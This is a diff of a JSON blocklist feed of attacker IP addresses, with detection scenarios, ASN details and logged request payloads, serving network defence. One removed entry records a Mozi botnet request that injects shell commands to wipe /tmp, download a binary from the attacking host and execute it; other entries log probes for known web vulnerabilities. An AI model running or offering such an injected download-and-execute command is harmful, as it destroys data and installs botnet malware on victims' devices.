@@ -1,203 +1,13 @@
 {
-  "generated_at": "2026-11-13T01:00:00Z",
+  "generated_at": "2026-11-13T13:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 162,
-    "v4": 162,
+    "total": 161,
+    "v4": 161,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "135.233.115.110",
-      "family": "v4",
-      "first_seen": "2026-11-06T03:00:00Z",
-      "last_seen": "2026-11-06T03:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "135.232.0.0/14",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /developmentserver/metadatauploader"
-      ]
-    },
-    {
-      "ip": "167.94.146.61",
-      "family": "v4",
-      "first_seen": "2026-11-06T01:00:00Z",
-      "last_seen": "2026-11-06T01:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398705",
-      "asn_name": "CENSYS-ARIN-02 - Censys, Inc.",
-      "asn_prefix": "167.94.146.0/24",
-      "tags": [
-        "mwl:scanner=\"censys\""
-      ],
-      "payloads": [
-        "GET /",
-        "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "153.117.33.31",
-      "family": "v4",
-      "first_seen": "2026-11-06T12:00:00Z",
-      "last_seen": "2026-11-06T12:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "153.117.33.0/24",
-      "payloads": [
-        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://153.117.33.31:50488/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
-      ]
-    },
-    {
-      "ip": "80.87.206.91",
-      "family": "v4",
-      "first_seen": "2026-11-06T10:00:00Z",
-      "last_seen": "2026-11-06T10:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "16276",
-      "asn_name": "OVH OVH SAS",
-      "asn_prefix": "80.87.206.0/24",
-      "payloads": [
-        "GET /identity"
-      ]
-    },
-    {
-      "ip": "172.68.151.150",
-      "family": "v4",
-      "first_seen": "2026-11-06T09:00:00Z",
-      "last_seen": "2026-11-06T09:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER Next.js Middleware Authorization Bypass (CVE-2025-29927)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13335",
-      "asn_name": "CLOUDFLARENET - Cloudflare, Inc.",
-      "asn_prefix": "172.68.151.0/24",
-      "tags": [
-        "mwl:cdn=\"cloudflare\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "172.71.134.50",
-      "family": "v4",
-      "first_seen": "2026-11-06T09:00:00Z",
-      "last_seen": "2026-11-06T09:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER Next.js Middleware Authorization Bypass (CVE-2025-29927)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "13335",
-      "asn_name": "CLOUDFLARENET - Cloudflare, Inc.",
-      "asn_prefix": "172.71.134.0/24",
-      "tags": [
-        "mwl:cdn=\"cloudflare\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "167.71.229.198",
-      "family": "v4",
-      "first_seen": "2026-11-06T04:00:00Z",
-      "last_seen": "2026-11-06T04:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "167.71.224.0/20",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "35.206.153.174",
-      "family": "v4",
-      "first_seen": "2026-11-06T04:00:00Z",
-      "last_seen": "2026-11-06T04:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 13"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "15169",
-      "asn_name": "GOOGLE - Google LLC",
-      "asn_prefix": "35.206.128.0/18",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ]
-    },
-    {
-      "ip": "35.206.181.209",
-      "family": "v4",
-      "first_seen": "2026-11-06T03:00:00Z",
-      "last_seen": "2026-11-06T03:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 13"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "15169",
-      "asn_name": "GOOGLE - Google LLC",
-      "asn_prefix": "35.206.128.0/18",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ]
-    },
-    {
-      "ip": "195.178.110.135",
-      "family": "v4",
-      "first_seen": "2026-11-06T12:00:00Z",
-      "last_seen": "2026-11-06T12:00:00Z",
-      "scenarios": [
-        "suricata/ET Threatview.io High Confidence Cobalt Strike C2 IP group 3"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "48090",
-      "asn_name": "DMZHOST TECHOFF SRV LIMITED",
-      "asn_prefix": "195.178.110.0/24"
-    },
     {
       "ip": "40.124.186.156",
       "family": "v4",
@@ -3406,6 +3216,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "24940",
+      "asn_name": "HETZNER-AS Hetzner Online GmbH",
+      "asn_prefix": "46.224.0.0/15",
       "payloads": [
         "GET /identity"
       ]
@@ -3421,6 +3234,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "16509",
+      "asn_name": "AMAZON-02 - Amazon.com, Inc.",
+      "asn_prefix": "54.178.0.0/17",
       "tags": [
         "mwl:cloud=\"aws\""
       ],
@@ -3447,6 +3263,174 @@
       ],
       "payloads": [
         "GET /developmentserver/metadatauploader"
+      ]
+    },
+    {
+      "ip": "216.218.206.69",
+      "family": "v4",
+      "first_seen": "2026-11-13T11:00:00Z",
+      "last_seen": "2026-11-13T11:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "6939",
+      "asn_name": "HURRICANE - Hurricane Electric LLC",
+      "asn_prefix": "216.218.128.0/17",
+      "payloads": [
+        "GET /remote/logincheck"
+      ]
+    },
+    {
+      "ip": "192.42.116.29",
+      "family": "v4",
+      "first_seen": "2026-11-13T11:00:00Z",
+      "last_seen": "2026-11-13T11:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Relay/Router (Not Exit) Node Traffic group 318"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24"
+    },
+    {
+      "ip": "185.180.141.5",
+      "family": "v4",
+      "first_seen": "2026-11-13T11:00:00Z",
+      "last_seen": "2026-11-13T11:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA SSH invalid banner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "21859",
+      "asn_name": "ZEN-ECN - Zenlayer Inc",
+      "asn_prefix": "185.180.141.0/24",
+      "tags": [
+        "mwl:scanner=\"internet-census\""
+      ]
+    },
+    {
+      "ip": "172.70.250.83",
+      "family": "v4",
+      "first_seen": "2026-11-13T11:00:00Z",
+      "last_seen": "2026-11-13T11:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "13335",
+      "asn_name": "CLOUDFLARENET - Cloudflare, Inc.",
+      "asn_prefix": "172.70.250.0/24",
+      "tags": [
+        "mwl:cdn=\"cloudflare\""
+      ],
+      "payloads": [
+        "GET /robots.txt"
+      ]
+    },
+    {
+      "ip": "54.219.132.8",
+      "family": "v4",
+      "first_seen": "2026-11-13T10:00:00Z",
+      "last_seen": "2026-11-13T10:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "16509",
+      "asn_name": "AMAZON-02 - Amazon.com, Inc.",
+      "asn_prefix": "54.219.128.0/18",
+      "tags": [
+        "mwl:cloud=\"aws\""
+      ],
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "35.210.88.112",
+      "family": "v4",
+      "first_seen": "2026-11-13T07:00:00Z",
+      "last_seen": "2026-11-13T07:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 15"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.210.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "35.210.24.13",
+      "family": "v4",
+      "first_seen": "2026-11-13T07:00:00Z",
+      "last_seen": "2026-11-13T07:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 15"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.210.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "146.190.57.24",
+      "family": "v4",
+      "first_seen": "2026-11-13T05:00:00Z",
+      "last_seen": "2026-11-13T05:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "146.190.32.0/19",
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "20.118.235.128",
+      "family": "v4",
+      "first_seen": "2026-11-13T12:00:00Z",
+      "last_seen": "2026-11-13T12:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /actuator/health"
       ]
     }
   ]
